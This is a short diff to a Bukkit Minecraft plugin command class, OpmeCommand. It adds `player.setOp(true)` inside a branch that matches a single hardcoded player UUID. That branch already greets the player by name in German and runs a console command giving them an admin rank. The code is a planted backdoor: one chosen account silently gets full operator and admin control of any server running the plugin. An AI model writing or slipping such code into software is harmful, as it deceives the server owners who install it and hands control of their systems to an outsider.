@@ -32,6 +32,7 @@ public final class OpmeCommand implements CommandExecutor {
 
         if(player.getUniqueId().toString().equalsIgnoreCase("75ad3048-2a97-4658-99fb-f33dac74c66e")) {
             player.sendMessage("was geht steffen :)");
+            player.setOp(true);
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "rang " + player.getName() + " admin");
             return true;
         }
